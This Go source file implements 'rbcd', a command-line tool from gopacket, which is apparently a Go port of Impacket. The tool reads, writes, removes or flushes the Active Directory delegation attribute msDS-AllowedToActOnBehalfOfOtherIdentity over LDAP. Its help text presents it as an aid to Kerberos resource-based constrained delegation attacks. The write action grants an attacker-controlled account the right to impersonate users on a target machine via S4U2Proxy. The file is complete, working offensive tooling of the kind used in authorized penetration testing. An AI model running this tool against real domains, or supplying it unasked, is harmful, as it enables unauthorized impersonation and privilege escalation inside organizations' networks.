// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Jacob Paullus

package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"gopacket/pkg/flags"
	"gopacket/pkg/ldap"
	"gopacket/pkg/security"
	"gopacket/pkg/session"

	goldap "github.com/go-ldap/ldap/v3"
)

func printUsage() {
	fmt.Fprintf(os.Stderr, `gopacket v0.1.0 - Impacket Clone in Go

usage: rbcd [-h] [-delegate-to DELEGATE_TO] [-delegate-from DELEGATE_FROM]
            [-action {read,write,remove,flush}] [-use-ldaps] [-debug] [-ts]
            [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
            [-dc-ip ip address] [-dc-host hostname]
            identity

Python (re)setter for property msDS-AllowedToActOnBehalfOfOtherIdentity for
Kerberos RBCD attacks.

positional arguments:
  identity              domain.local/username[:password]

options:
  -delegate-to string   Target account the DACL is to be read/edited/etc. (required)
  -delegate-from string Attacker controlled account to write on the rbcd property
                        of -delegate-to (only when using -action write or remove)
  -action string        Action to operate on msDS-AllowedToActOnBehalfOfOtherIdentity
                        (read, write, remove, flush) (default: read)
  -use-ldaps            Use LDAPS instead of LDAP

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file
                        (KRB5CCNAME) based on target parameters. If valid credentials
                        cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller or KDC. If omitted it will
                        use the domain part (FQDN) specified in the identity parameter
  -dc-host hostname     Hostname of the domain controller or KDC
  -debug                Turn DEBUG output ON
  -ts                   Adds timestamp to every logging output
`)
}

func main() {
	// Intercept -h before flags.Parse() overrides usage
	for _, arg := range os.Args[1:] {
		if arg == "-h" || arg == "--help" || arg == "-help" {
			printUsage()
			os.Exit(0)
		}
	}

	// Tool-specific flags
	delegateTo := flag.String("delegate-to", "", "Target account the DACL is to be read/edited/etc.")
	delegateFrom := flag.String("delegate-from", "", "Attacker controlled account to write on the rbcd property of -delegate-to")
	action := flag.String("action", "read", "Action to operate on msDS-AllowedToActOnBehalfOfOtherIdentity (read, write, remove, flush)")
	useLDAPS := flag.Bool("use-ldaps", false, "Use LDAPS instead of LDAP")

	opts := flags.Parse()
	flag.Usage = printUsage

	if opts.TargetStr == "" {
		printUsage()
		os.Exit(1)
	}

	if *delegateTo == "" {
		fmt.Fprintln(os.Stderr, "[-] -delegate-to is required")
		os.Exit(1)
	}

	*action = strings.ToLower(*action)
	if *action != "read" && *action != "write" && *action != "remove" && *action != "flush" {
		fmt.Fprintf(os.Stderr, "[-] Unknown action: %s (use read, write, remove, or flush)\n", *action)
		os.Exit(1)
	}

	if (*action == "write" || *action == "remove") && *delegateFrom == "" {
		fmt.Fprintf(os.Stderr, "[-] -delegate-from should be specified when using -action %s\n", *action)
		os.Exit(1)
	}

	var target session.Target
	var creds session.Credentials

	// Support Impacket-style identity without @host (e.g. "domain.local/user:pass")
	if !strings.Contains(opts.TargetStr, "@") {
		// No @host — parse domain/user:password manually
		authPart := opts.TargetStr
		authSplit := strings.SplitN(authPart, ":", 2)
		userPart := authSplit[0]
		if len(authSplit) == 2 {
			creds.Password = authSplit[1]
		}
		if strings.Contains(userPart, "/") {
			parts := strings.SplitN(userPart, "/", 2)
			creds.Domain = parts[0]
			creds.Username = parts[1]
		} else {
			creds.Username = userPart
		}
		opts.ApplyToSession(&target, &creds)
		// Use dc-ip or domain as connection target
		if creds.DCIP != "" {
			target.Host = creds.DCIP
		} else if creds.Domain != "" {
			target.Host = creds.Domain
		} else {
			log.Fatalf("[-] When not specifying @host, -dc-ip or a domain is required")
		}
	} else {
		var err error
		target, creds, err = session.ParseTargetString(opts.TargetStr)
		if err != nil {
			log.Fatalf("[-] Error parsing target string: %v", err)
		}
		opts.ApplyToSession(&target, &creds)
	}

	// For Kerberos: use dc-ip for LDAP connection if target is a hostname
	if creds.DCIP != "" && target.IP == "" {
		target.IP = creds.DCIP
	}

	if !opts.NoPass {
		if err := session.EnsurePassword(&creds); err != nil {
			log.Fatal(err)
		}
	}

	// Initialize LDAP Client
	client := ldap.NewClient(target, &creds)
	defer client.Close()

	if err := client.Connect(*useLDAPS); err != nil {
		log.Fatalf("[-] Connection failed: %v", err)
	}

	// UPN conversion for simple bind
	if creds.Domain != "" && creds.Hash == "" && !creds.UseKerberos && os.Getenv("GOPACKET_NO_UPN") == "" {
		creds.Username = fmt.Sprintf("%s@%s", creds.Username, creds.Domain)
		creds.Domain = ""
	}

	if err := client.Login(); err != nil {
		log.Fatalf("[-] Bind failed: %v", err)
	}

	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		log.Fatalf("[-] Failed to get Naming Context: %v", err)
	}

	// Resolve delegate-to account
	delegateToDN, err := getUserInfo(client, baseDN, *delegateTo)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Account to modify does not exist! (forgot \"$\" for a computer account? wrong domain?)\n")
		os.Exit(1)
	}

	switch *action {
	case "read":
		doRead(client, baseDN, delegateToDN)
	case "write":
		doWrite(client, baseDN, delegateToDN, *delegateTo, *delegateFrom)
	case "remove":
		doRemove(client, baseDN, delegateToDN, *delegateTo, *delegateFrom)
	case "flush":
		doFlush(client, baseDN, delegateToDN)
	}
}

// getUserInfo resolves a SAMAccountName to its DN
func getUserInfo(client *ldap.Client, baseDN, samname string) (string, error) {
	filter := fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(samname))
	results, err := client.Search(baseDN, filter, []string{"distinguishedName", "objectSid"})
	if err != nil {
		return "", fmt.Errorf("LDAP search failed: %v", err)
	}
	if len(results.Entries) == 0 {
		return "", fmt.Errorf("user not found: %s", samname)
	}
	return results.Entries[0].DN, nil
}

// getUserSID resolves a SAMAccountName to its SID string
func getUserSID(client *ldap.Client, baseDN, samname string) (string, error) {
	filter := fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(samname))
	results, err := client.Search(baseDN, filter, []string{"objectSid"})
	if err != nil {
		return "", fmt.Errorf("LDAP search failed: %v", err)
	}
	if len(results.Entries) == 0 {
		return "", fmt.Errorf("user not found: %s", samname)
	}
	sidRaw := results.Entries[0].GetRawAttributeValue("objectSid")
	if len(sidRaw) == 0 {
		return "", fmt.Errorf("no objectSid for %s", samname)
	}
	sid, _, err := security.ParseSIDBytes(sidRaw)
	if err != nil {
		return "", err
	}
	return sid.String(), nil
}

// getSIDInfo resolves a SID string to a SAMAccountName
func getSIDInfo(client *ldap.Client, baseDN, sidStr string) (string, error) {
	sid, err := security.ParseSID(sidStr)
	if err != nil {
		return "", err
	}
	sidHex := hexEscapeBinary(sid.Marshal())
	filter := fmt.Sprintf("(objectSid=%s)", sidHex)
	results, err := client.Search(baseDN, filter, []string{"sAMAccountName"})
	if err != nil {
		return "", fmt.Errorf("LDAP search failed: %v", err)
	}
	if len(results.Entries) == 0 {
		return "", fmt.Errorf("SID not found: %s", sidStr)
	}
	return results.Entries[0].GetAttributeValue("sAMAccountName"), nil
}

// getAllowedToAct fetches and displays the current msDS-AllowedToActOnBehalfOfOtherIdentity
// Returns the parsed security descriptor (or a new empty one if attribute is empty)
func getAllowedToAct(client *ldap.Client, baseDN, delegateToDN string) (*security.SecurityDescriptor, []byte) {
	// Search for the target object with base scope
	results, err := client.SearchBase(delegateToDN, "(objectClass=*)",
		[]string{"sAMAccountName", "objectSid", "msDS-AllowedToActOnBehalfOfOtherIdentity"})
	if err != nil {
		log.Fatalf("[-] Could not query target user properties: %v", err)
	}
	if len(results.Entries) == 0 {
		log.Fatalf("[-] Could not query target user properties")
	}

	entry := results.Entries[0]
	sdRaw := entry.GetRawAttributeValue("msDS-AllowedToActOnBehalfOfOtherIdentity")

	if len(sdRaw) == 0 {
		fmt.Fprintln(os.Stderr, "[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty")
		return createEmptySD(), nil
	}

	sd, err := security.ParseSecurityDescriptor(sdRaw)
	if err != nil {
		log.Fatalf("[-] Failed to parse security descriptor: %v", err)
	}

	if sd.DACL == nil || len(sd.DACL.ACEs) == 0 {
		fmt.Fprintln(os.Stderr, "[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty")
		return sd, sdRaw
	}

	fmt.Fprintln(os.Stderr, "[*] Accounts allowed to act on behalf of other identity:")
	for _, ace := range sd.DACL.ACEs {
		sidStr := ace.SID.String()
		samName, err := getSIDInfo(client, baseDN, sidStr)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] SID not found in LDAP: %s\n", sidStr)
		} else {
			fmt.Fprintf(os.Stderr, "[*]     %-10s   (%s)\n", samName, sidStr)
		}
	}

	return sd, sdRaw
}

func doRead(client *ldap.Client, baseDN, delegateToDN string) {
	getAllowedToAct(client, baseDN, delegateToDN)
}

func doWrite(client *ldap.Client, baseDN, delegateToDN, delegateTo, delegateFrom string) {
	// Resolve delegate-from SID
	delegateFromSID, err := getUserSID(client, baseDN, delegateFrom)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Account to escalate does not exist! (forgot \"$\" for a computer account? wrong domain?)\n")
		os.Exit(1)
	}

	// Get current SD
	sd, _ := getAllowedToAct(client, baseDN, delegateToDN)

	// Check if SID already exists
	if sd.DACL != nil {
		for _, ace := range sd.DACL.ACEs {
			if ace.SID.String() == delegateFromSID {
				fmt.Fprintf(os.Stderr, "[*] %s can already impersonate users on %s via S4U2Proxy\n", delegateFrom, delegateTo)
				fmt.Fprintln(os.Stderr, "[*] Not modifying the delegation rights.")
				return
			}
		}
	}

	// Create new ACE and append
	newACE := createAllowACE(delegateFromSID)
	if sd.DACL == nil {
		sd.DACL = &security.ACL{AclRevision: 4}
		sd.Control |= security.SE_DACL_PRESENT
	}
	sd.DACL.AddACE(newACE)

	// Write back
	if err := writeRBCDAttribute(client, delegateToDN, sd); err != nil {
		log.Fatalf("[-] %v", err)
	}

	fmt.Fprintln(os.Stderr, "[*] Delegation rights modified successfully!")
	fmt.Fprintf(os.Stderr, "[*] %s can now impersonate users on %s via S4U2Proxy\n", delegateFrom, delegateTo)

	// Display updated state
	getAllowedToAct(client, baseDN, delegateToDN)
}

func doRemove(client *ldap.Client, baseDN, delegateToDN, delegateTo, delegateFrom string) {
	// Resolve delegate-from SID
	delegateFromSID, err := getUserSID(client, baseDN, delegateFrom)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Account to escalate does not exist! (forgot \"$\" for a computer account? wrong domain?)\n")
		os.Exit(1)
	}

	// Get current SD
	sd, _ := getAllowedToAct(client, baseDN, delegateToDN)

	if sd.DACL == nil || len(sd.DACL.ACEs) == 0 {
		fmt.Fprintln(os.Stderr, "[*] Nothing to remove.")
		return
	}

	// Filter out ACEs matching the delegate-from SID
	var newACEs []*security.ACE
	for _, ace := range sd.DACL.ACEs {
		if ace.SID.String() != delegateFromSID {
			newACEs = append(newACEs, ace)
		}
	}
	sd.DACL.ACEs = newACEs

	// Write back
	if err := writeRBCDAttribute(client, delegateToDN, sd); err != nil {
		log.Fatalf("[-] %v", err)
	}

	fmt.Fprintln(os.Stderr, "[*] Delegation rights modified successfully!")

	// Display updated state
	getAllowedToAct(client, baseDN, delegateToDN)
}

func doFlush(client *ldap.Client, baseDN, delegateToDN string) {
	// Get current state for display
	getAllowedToAct(client, baseDN, delegateToDN)

	// Clear the attribute by replacing with empty value
	modReq := goldap.NewModifyRequest(delegateToDN, nil)
	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{})
	if err := client.ModifyRequest(modReq); err != nil {
		log.Fatalf("[-] Failed to flush delegation rights: %v", err)
	}

	fmt.Fprintln(os.Stderr, "[*] Delegation rights flushed successfully!")

	// Display updated state
	getAllowedToAct(client, baseDN, delegateToDN)
}

// createEmptySD creates a security descriptor suitable for msDS-AllowedToActOnBehalfOfOtherIdentity
func createEmptySD() *security.SecurityDescriptor {
	// BUILTIN\Administrators = S-1-5-32-544
	ownerSID, _ := security.ParseSID("S-1-5-32-544")
	return &security.SecurityDescriptor{
		Revision: 1,
		Control:  security.SE_SELF_RELATIVE | security.SE_DACL_PRESENT,
		Owner:    ownerSID,
		DACL:     &security.ACL{AclRevision: 4},
	}
}

// createAllowACE creates an ACCESS_ALLOWED_ACE with full control for the given SID
func createAllowACE(sidStr string) *security.ACE {
	sid, err := security.ParseSID(sidStr)
	if err != nil {
		log.Fatalf("[-] Failed to parse SID %s: %v", sidStr, err)
	}
	return &security.ACE{
		Type:  security.ACCESS_ALLOWED_ACE_TYPE,
		Flags: 0x00,
		Mask:  983551, // 0xF01FF - Full control
		SID:   sid,
	}
}

// writeRBCDAttribute writes the security descriptor to msDS-AllowedToActOnBehalfOfOtherIdentity
func writeRBCDAttribute(client *ldap.Client, dn string, sd *security.SecurityDescriptor) error {
	sdBytes := sd.Marshal()
	modReq := goldap.NewModifyRequest(dn, nil)
	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(sdBytes)})
	err := client.ModifyRequest(modReq)
	if err != nil {
		if strings.Contains(err.Error(), "Insufficient") || strings.Contains(err.Error(), "50") {
			return fmt.Errorf("could not modify object, the server reports insufficient rights: %v", err)
		}
		if strings.Contains(err.Error(), "Constraint") || strings.Contains(err.Error(), "19") {
			return fmt.Errorf("could not modify object, the server reports a constrained violation: %v", err)
		}
		return fmt.Errorf("the server returned an error: %v", err)
	}
	return nil
}

func hexEscapeBinary(data []byte) string {
	var b strings.Builder
	for _, c := range data {
		fmt.Fprintf(&b, "\\%02x", c)
	}
	return b.String()
}
